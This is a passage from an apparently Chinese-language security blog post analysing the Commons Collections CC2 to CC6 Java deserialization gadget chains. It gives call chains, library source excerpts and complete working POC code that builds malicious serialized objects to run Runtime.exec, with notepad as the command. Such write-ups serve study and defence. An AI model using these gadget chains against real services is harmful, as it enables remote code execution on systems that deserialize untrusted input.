    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {}
}
```

注意此处必须继承AbstractTranslet类，因为：

```java
// Check if this is the main class                
if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
	_transletIndex = i;
}
```

这也才能确认main class。

随后按照刚才分析，我们调用newTransformer方法：

```java
import java.io.*;
import java.lang.reflect.Field;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;


public class Main {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Field b = templates.getClass().getDeclaredField("_bytecodes");
        b.setAccessible(true);
        Field n = templates.getClass().getDeclaredField("_name");
        n.setAccessible(true);
        Field f = templates.getClass().getDeclaredField("_tfactory");
        f.setAccessible(true);
        File file = new File(".\\target\\classes\\com\\sun\\org\\apache\\xalan\\internal\\xsltc\\runtime\\Evil.class");
        FileInputStream inputStream = new FileInputStream(file);
        Long length = file.length();
        byte[] code = new byte[length.intValue()];
        inputStream.read(code);
        byte[][] codes = new byte[][]{code};
        b.set(templates, codes);
        n.set(templates, "0");
        f.set(templates, new TransformerFactoryImpl());
        templates.newTransformer();
    }
}
```

可以确认确实执行了notepad，接下来思考如何去触发newTransformer方法。

结合前面的，不难发现利用InvokerTransformer的transform反射获取TemplatesImpl的newTransformer方法并执行即可。

则得到POC如下：

```java
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class Main {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Field b = templates.getClass().getDeclaredField("_bytecodes");
        b.setAccessible(true);
        Field n = templates.getClass().getDeclaredField("_name");
        n.setAccessible(true);
        Field f = templates.getClass().getDeclaredField("_tfactory");
        f.setAccessible(true);
        File file = new File(".\\target\\classes\\com\\sun\\org\\apache\\xalan\\internal\\xsltc\\runtime\\Evil.class");
        FileInputStream inputStream = new FileInputStream(file);
        Long length = file.length();
        byte[] code = new byte[length.intValue()];
        inputStream.read(code);
        byte[][] codes = new byte[][]{code};
        b.set(templates, codes);
        n.set(templates, "0");
        f.set(templates, new TransformerFactoryImpl());
//        templates.newTransformer();

        Constructor constructor = InvokerTransformer.class.getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        InvokerTransformer transformer = (InvokerTransformer)constructor.newInstance("newTransformer");
        TransformingComparator comparator = new TransformingComparator(transformer);

        PriorityQueue queue = new PriorityQueue(2);
        Object[] queue_inner = new Object[]{templates, 1};
        Field field_queue = PriorityQueue.class.getDeclaredField("queue");
        field_queue.setAccessible(true);
        field_queue.set(queue, queue_inner);

        Field size = PriorityQueue.class.getDeclaredField("size");
        size.setAccessible(true);
        size.set(queue, 2);

        Field field_com = PriorityQueue.class.getDeclaredField("comparator");
        field_com.setAccessible(true);
        field_com.set(queue, comparator);
        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc2"));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream in = new ObjectInputStream(new FileInputStream("./cc2"));
            in.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}
```

这个POC并不完整，还需要对Evil.java进行编译，可以使用javassit进行生成evil的class：

```java
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;


public class Main {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Field b = templates.getClass().getDeclaredField("_bytecodes");
        b.setAccessible(true);
        Field n = templates.getClass().getDeclaredField("_name");
        n.setAccessible(true);
        Field f = templates.getClass().getDeclaredField("_tfactory");
        f.setAccessible(true);

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Evil");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"notepad\");";
        cc.makeClassInitializer().insertBefore(cmd);

        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        byte[] code = cc.toBytecode();
        byte[][] codes = new byte[][]{code};
        b.set(templates, codes);
        n.set(templates, "0");
        f.set(templates, new TransformerFactoryImpl());
//        templates.newTransformer();

        Constructor constructor = InvokerTransformer.class.getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        InvokerTransformer transformer = (InvokerTransformer)constructor.newInstance("newTransformer");
        TransformingComparator comparator = new TransformingComparator(transformer);

        PriorityQueue queue = new PriorityQueue(2);
        Object[] queue_inner = new Object[]{templates, 1};
        Field field_queue = PriorityQueue.class.getDeclaredField("queue");
        field_queue.setAccessible(true);
        field_queue.set(queue, queue_inner);

        Field size = PriorityQueue.class.getDeclaredField("size");
        size.setAccessible(true);
        size.set(queue, 2);

        Field field_com = PriorityQueue.class.getDeclaredField("comparator");
        field_com.setAccessible(true);
        field_com.set(queue, comparator);
        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc2"));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream in = new ObjectInputStream(new FileInputStream("./cc2"));
            in.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}
```

到这里CC2其实就分析完成了，两个不同的利用链其实个人感觉第一条结合CC1的链会比较好，比较容易。

#### 0x43 Commons Collections 3链

##### 0x431 环境参数

* Java 1.7
* Commons Collections 3.1
* javassit(非必要)

Pom.xml如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>cc</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>7</maven.compiler.source>
        <maven.compiler.target>7</maven.compiler.target>
    </properties>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.25.0-GA</version>
        </dependency>

    </dependencies>
</project>
```

##### 0x432 利用链分析

> 其实就是结合了一下CC1和CC2。

在CC2中，我们使用了TemplatesImpl的newTransformer随后载入了恶意字节码进而实现命令执行，实现方式是使用InvokerTransformer类的transform方法中的反射调用。

在CC3中，我们则是考虑使用TrAXFilter类来调用TemplatesImpl的newTransformer方法。

来看TrAXFilter类的构造方法定义：

```java
    public TrAXFilter(Templates templates)  throws
        TransformerConfigurationException
    {
        _templates = templates;
        _transformer = (TransformerImpl) templates.newTransformer();
        _transformerHandler = new TransformerHandlerImpl(_transformer);
        _useServicesMechanism = _transformer.useServicesMechnism();
    }
```

不难发现，在构造函数中调用了templates.newTransformer方法，那么如果我们可以找到一个地方创建TrAXFilter实例的话，就能链接上CC2链。

而这也就是CC3链利用到的InstantiateTransformer类，其transform代码如下：

```java
public Object transform(Object input) {
    try {
        if (!(input instanceof Class)) {
            throw new FunctorException("InstantiateTransformer: Input object was not an instanceof Class, it was a " + (input == null ? "null object" : input.getClass().getName()));
        } else {
            Constructor con = ((Class)input).getConstructor(this.iParamTypes);
            return con.newInstance(this.iArgs);
        }
    } catch (xxx) {}
}
```

容易发现，如果将input设为**TrAXFilter.Class**，就可以返回一个TrAXFilter实例，并且iArgs是可控的，见InstantiateTransformer构造方法如下：

```java
    public InstantiateTransformer(Class[] paramTypes, Object[] args) {
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }
```

于是结合CC1于CC2，我们就可以得到一个完整的利用链如下：

```java
ObjectInputStream.readObject()
  - AnnotationInvocationHandler.readObject()
    - Map(Proxy).entrySet()
      - AnnotationInvocationHandler.invoke()
        - LazyMap.get()
          - ChainedTransformer.transform()
          - ConstantTransformer.transform()
          - InstantiateTransformer.transform()
          - newInstancce()
            - TrAXFilter.TrAXFilter(Templates)
            - TemplatesImpl.newTransformer()
              - TemplatesImpl.getTransletInstance()
              - TemplatesImpl.defineTransletClasses()
              - newInstance()
                - Runtime.exec()
```

完整POC如下：

```java
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;


public class Main {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Field b = templates.getClass().getDeclaredField("_bytecodes");
        b.setAccessible(true);
        Field n = templates.getClass().getDeclaredField("_name");
        n.setAccessible(true);
        Field f = templates.getClass().getDeclaredField("_tfactory");
        f.setAccessible(true);

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Evil");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"notepad\");";
        cc.makeClassInitializer().insertBefore(cmd);

        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        byte[] code = cc.toBytecode();
        byte[][] codes = new byte[][]{code};
        b.set(templates, codes);
        n.set(templates, "0");
        f.set(templates, new TransformerFactoryImpl());
//        templates.newTransformer();

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        });
        HashMap innerMap = new HashMap();
        LazyMap map = (LazyMap) LazyMap.decorate(innerMap, chain);

        Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handler_constructor.setAccessible(true);

        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map);
        Map promap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class},  map_handler);
        InvocationHandler handler = (InvocationHandler) handler_constructor.newInstance(Override.class, promap);


        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc3"));
            outputStream.writeObject(handler);
            outputStream.close();

            ObjectInputStream in = new ObjectInputStream(new FileInputStream("./cc3"));
            in.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}
```

理解了CC1和CC2应该还是看这个完全没有难度，细节问题可以参考CC1和CC2。

#### 0x44 Commons Collections 4链

##### 0x441 环境参数

* Java 1.7
* Commons Collections 4.0

参考Pom.xml：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>cc</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>7</maven.compiler.source>
        <maven.compiler.target>7</maven.compiler.target>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>

    </dependencies>
</project>
```

##### 0x442 利用链分析

> 其实也很简单，相当于CC3的后半段和CC2的前半段结合。

给出利用链，这个看着利用链自己参考CC2和CC3的POC写出POC应该很简单了：

```java
ObjectInputStream.readObject()
  - PriorityQueue.readObject()
    - PriorityQueue.heapify()
      - PriorityQueue.siftDown()
        - PriorityQueue.siftDownUsingComparator()
          - TransformingComparator.compare()
            - ChainedTransformer.transform()
              - ConstantTransformer.transform()
              - InstantiateTransformer.transform()
              - newInstance()
                - TrAXFilter.TrAXFilter(Templates)
                - TemplatesImpl.newTransformer()
                  - TemplatesImpl.getTransletInstance()
                  - TemplatesImpl.defineTransletClasses()
                  - newInstance()
                    - Runtime.exec()
```

完整的POC如下：

```java
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.*;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.*;
import javax.xml.transform.Templates;


public class Main {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Field b = templates.getClass().getDeclaredField("_bytecodes");
        b.setAccessible(true);
        Field n = templates.getClass().getDeclaredField("_name");
        n.setAccessible(true);
        Field f = templates.getClass().getDeclaredField("_tfactory");
        f.setAccessible(true);

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Evil");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"notepad\");";
        cc.makeClassInitializer().insertBefore(cmd);

        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        byte[] code = cc.toBytecode();
        byte[][] codes = new byte[][]{code};
        b.set(templates, codes);
        n.set(templates, "0");
        f.set(templates, new TransformerFactoryImpl());
//        templates.newTransformer();

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        });

        Object queue_array = new Object[]{templates, 0};
        PriorityQueue queue = new PriorityQueue(2);
        Field field_queue = PriorityQueue.class.getDeclaredField("queue");
        field_queue.setAccessible(true);
        Field field_size = PriorityQueue.class.getDeclaredField("size");
        field_size.setAccessible(true);
        field_size.set(queue, 2);
        field_queue.set(queue, queue_array);

        Constructor constructor = InvokerTransformer.class.getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        TransformingComparator comparator = new TransformingComparator(chain);

        Field field_comparator = PriorityQueue.class.getDeclaredField("comparator");
        field_comparator.setAccessible(true);
        field_comparator.set(queue, comparator);


        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc4"));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream in = new ObjectInputStream(new FileInputStream("./cc4"));
            in.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}
```

##### 0x443 使用InvokerTransformer缩短CC4利用链

甚至可以更短，直接在TransformingComparator.compare方法调用InvokerTransformer的transform方法，从而RCE(本人也不知这还算不算CC4链，但是看上面的总觉别扭，直接使用InvokerTransformer到达TemplatesImpl.newTransformer()似乎更好)，利用链可以精短为：

```java
ObjectInputStream.readObject()
  - PriorityQueue.readObject()
    - PriorityQueue.heapify()
      - PriorityQueue.siftDown()
        - PriorityQueue.siftDownUsingComparator()
          - TransformingComparator.compare()
            - InvokerTransformer.transform()
              - TemplatesImpl.newTransformer()
                - TemplatesImpl.getTransletInstance()
                - TemplatesImpl.defineTransletClasses()
                - newInstance()
                  - Runtime.exec()
```

完整的POC如下：

```java
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;



public class Main {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Field b = templates.getClass().getDeclaredField("_bytecodes");
        b.setAccessible(true);
        Field n = templates.getClass().getDeclaredField("_name");
        n.setAccessible(true);
        Field f = templates.getClass().getDeclaredField("_tfactory");
        f.setAccessible(true);

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Evil");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"notepad\");";
        cc.makeClassInitializer().insertBefore(cmd);

        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        byte[] code = cc.toBytecode();
        byte[][] codes = new byte[][]{code};
        b.set(templates, codes);
        n.set(templates, "0");
        f.set(templates, new TransformerFactoryImpl());
//        templates.newTransformer();


        Object queue_array = new Object[]{templates, 0};
        PriorityQueue queue = new PriorityQueue(2);
        Field field_queue = PriorityQueue.class.getDeclaredField("queue");
        field_queue.setAccessible(true);
        Field field_size = PriorityQueue.class.getDeclaredField("size");
        field_size.setAccessible(true);
        field_size.set(queue, 2);
        field_queue.set(queue, queue_array);

        Constructor constructor = InvokerTransformer.class.getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance("newTransformer");
        TransformingComparator comparator = new TransformingComparator(transformer);

        Field field_comparator = PriorityQueue.class.getDeclaredField("comparator");
        field_comparator.setAccessible(true);
        field_comparator.set(queue, comparator);


        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc4"));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream in = new ObjectInputStream(new FileInputStream("./cc4"));
            in.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}
```

#### 0x45 Commons Collections 5链

##### 0x451 环境参数

* Java 1.7
* Commons Collections 3.1

参考Pom.xml：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>cc</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>7</maven.compiler.source>
        <maven.compiler.target>7</maven.compiler.target>
    </properties>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>
</project>
```

##### 0x452 利用链分析

先给出利用链：

```java
ObjectInputStream.readObject()
  - BadAttributeValueExpException.readObject()
    - TiedMapEntry.toString()
      - LazyMap.get()
        - ChainedTransformer.transform()
          - ConstantTransformer.transform()
          - InvokerTransformer.transform()
            - Method.invoke()
              - Class.getMethod()
          - InvokerTransformer.transform()
            - Method.invoke()
              - Runtime.getRuntime()
          - InvokerTransformer.transform()
            - Method.invoke()
    		  - Runtime.exec()
```

不难发现到了LazyMap.get()方法后其实都是CC1的，因此只需要分析前面的**BadAttributeValuteExpException**和**TiedMapEntry**即可。

先观察其readObject方法：

```java
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
```

注意到`val = valObj.toString()`，即调用了**valObj**的toString方法，而这个对象是怎么来的呢？

`Object valObj = gf.get("val", null);`，即从Field取出来的，并且val显然是可被序列化的(在readObject中对其进行了赋值)，因此是可控的。

接下来考虑的事情就是，如何去利用**toString**方法进一步呢？

CC5中使用的是**TiedMapEntry**类，其**toString**方法如下：

```java
public String toString() {
	return this.getKey() + "=" + this.getValue();
}
```

很简单，返回了**getKey**和**getValue**方法的返回值，查看这两个方法：

```java
public Object getKey() {	return this.key;	}
public Object getValue() {	return this.map.get(this.key);	}
```

那么接下来关注的就是`this.map.get(this.key)`了，，其map成员就是一个Map引用：

```java
private final Map map;
```

可控的，并且我们注意到了调用了Map引用的get方法，没错，这就和LazyMap联系上了。

抄一下CC1链，看看能否执行命令：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;

public class Main {
    public static void main(String[] args) throws Exception{
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"notepad"})});
        HashMap inMap = new HashMap();
        LazyMap map = (LazyMap) LazyMap.decorate(inMap, chain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, 0);
        tiedMapEntry.toString();
    }
}
```

执行成功，可以弹出记事本，说明没有问题。

接下来是我们引入BadAttributeValueExpException的POC：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;


public class Main {
    public static void main(String[] args) throws Exception{
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"notepad"})});
        HashMap inMap = new HashMap();
        LazyMap map = (LazyMap) LazyMap.decorate(inMap, chain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, 0);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(0);
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, tiedMapEntry);
        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc5"));
            outputStream.writeObject(badAttributeValueExpException);
            outputStream.close();

            ObjectInputStream in = new ObjectInputStream(new FileInputStream("./cc5"));
            in.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}
```

关于细节：

1. 使用反射设置val值是因为使用默认的构造方法会导致调用TiedMapEntry的toString方法，见其构造方法

其余都很简单了，就不赘述了。

#### 0x46 Commons Collections 6链

##### 0x461 环境参数

* JDK1.7
* Common Collections 3.1

参考pom.xml如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>cc</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>7</maven.compiler.source>
        <maven.compiler.target>7</maven.compiler.target>
    </properties>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>
</project>
```

##### 0x462 利用链分析

在CC5链中，我们使用了TiedMapEntry触发了LazyMap的get方法，其实CC6链本质也是触发LazyMap的get方法。

其利用链如下：

```java
ObjectInputStream.readObject()
  - HashSet.readObject()
    - HashMap.put()
      - HashMap.hash()
        - TiedMapEntry.hashCode()
        - TiedMapEntry.getValue()
          - LazyMap.get()
            - ChainedTransformer.transform()
            - CC1...
```

先看HashSet的readObject方法：

```java
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in any hidden serialization magic
        s.defaultReadObject();

        // Read in HashMap capacity and load factor and create backing HashMap
        int capacity = s.readInt();
        float loadFactor = s.readFloat();
        map = (((HashSet)this) instanceof LinkedHashSet ?
               new LinkedHashMap<E,Object>(capacity, loadFactor) :
               new HashMap<E,Object>(capacity, loadFactor));

        // Read in size
        int size = s.readInt();

        // Read in all elements in the proper order.
        for (int i=0; i<size; i++) {
            E e = (E) s.readObject();
            map.put(e, PRESENT);
        }
    }
```

其中的map不难看出可以控制为HashMap，而后在最后的循环中调用HashMap的put方法，而put方法的参数e是什么呢？

这需要看其writeObject方法：

```java
    private void writeObject(java.io.ObjectOutputStream s)
        throws java.io.IOException {
        // Write out any hidden serialization magic
        s.defaultWriteObject();

        // Write out HashMap capacity and load factor
        s.writeInt(map.capacity());
        s.writeFloat(map.loadFactor());

        // Write out size
        s.writeInt(map.size());

        // Write out all elements in the proper order.
        for (E e : map.keySet())
            s.writeObject(e);
    }
```

说明e是keySet中的元素，即控制map的keySet就可以控制put方法的参数。

而put方法是这样的：

```java
    public V put(K key, V value) {
        if (table == EMPTY_TABLE) {
            inflateTable(threshold);
        }
        if (key == null)
            return putForNullKey(value);
        int hash = hash(key);
        int i = indexFor(hash, table.length);
        for (Entry<K,V> e = table[i]; e != null; e = e.next) {
            Object k;
            if (e.hash == hash && ((k = e.key) == key || key.equals(k))) {
                V oldValue = e.value;
                e.value = value;
                e.recordAccess(this);
                return oldValue;
            }
        }
```

我们可以看到对传入的参数key执行了一次hash函数，该函数如下：

```java
    final int hash(Object k) {
        int h = hashSeed;
        if (0 != h && k instanceof String) {
            return sun.misc.Hashing.stringHash32((String) k);
        }

        h ^= k.hashCode();

        // This function ensures that hashCodes that differ only by
        // constant multiples at each bit position have a bounded
        // number of collisions (approximately 8 at default load factor).
        h ^= (h >>> 20) ^ (h >>> 12);
        return h ^ (h >>> 7) ^ (h >>> 4);
    }
```

这里的k显然就是我们keySet中的元素。

接下来就是需要寻找hashCode方法中能调用LazyMap的get方法的类了，在CC7中，这个类其实还是TiedMapEntry，其hashCode方法如下：

```java
    public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }
```

在其定义中没有调用get方法，但是在其第一行，`Object value = this.getValue();`，而getValue的定义如下：

```java
    public Object getValue() {
        return this.map.get(this.key);
    }
```

于是成功地可以调用LazyMap的get方法。

于是整体的POC除了前面的需要修改一下，剩下的抄CC1即可：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

public class Main {
    public static void main(String[] args) throws Exception{
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"notepad"})});
        HashMap inMap = new HashMap();
        LazyMap map = (LazyMap) LazyMap.decorate(inMap, chain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, 0);

        HashSet set = new HashSet(1);
        set.add(0);

        Field field_map = HashSet.class.getDeclaredField("map");
        field_map.setAccessible(true);
        HashMap hashset_map = (HashMap) field_map.get(set);

        Field field_table = HashMap.class.getDeclaredField("table");
        field_table.setAccessible(true);
        Object[] arr = (Object[]) field_table.get(hashset_map);

        Field field_key =  arr[0].getClass().getDeclaredField("key");
        field_key.setAccessible(true);
        field_key.set(arr[0], tiedMapEntry);
        
        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc6"));
            outputStream.writeObject(set);
            outputStream.close();

            ObjectInputStream in = new ObjectInputStream(new FileInputStream("./cc6"));
            in.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```

关于细节：

1. 之所以要先add(0)，是因为后面反射获取其内部HashMap并设置HashMap内部的table时所需要

#### 0x47 Commons Collections 7链

##### 0x471 环境参数

* Java 8u131
* Commons Collections 3.1

参考pom.xml如下：

```java
